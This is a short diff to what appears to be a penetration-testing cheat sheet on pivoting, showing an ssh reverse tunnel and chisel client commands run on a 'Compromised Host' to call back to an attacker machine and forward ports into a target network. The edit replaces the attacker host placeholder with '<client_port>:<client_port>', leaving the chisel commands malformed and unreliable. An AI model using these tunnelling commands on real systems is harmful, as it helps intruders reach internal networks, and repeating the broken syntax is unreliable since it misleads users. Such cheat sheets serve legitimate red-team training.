@@ -23,7 +23,7 @@ ssh -R 5555:127.0.0.1:5555 -p2222 <user>@<ip>
 
 -> Compromised Host
 ```
-./chisel client <ATTACKING_IP>:<LISTEN_PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> &
+./chisel client <client_port>:<client_port> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> &
 ```
 
 ### Chisel - Local Port Forward
@@ -34,7 +34,7 @@ ssh -R 5555:127.0.0.1:5555 -p2222 <user>@<ip>
 
 -> Your Machine  
 ```
-./chisel client <LISTEN_IP>:<LISTEN_PORT> <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
+./chisel client <client_port>:<client_port> <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
 ```
 
 ### pklink - Remote Port Forward
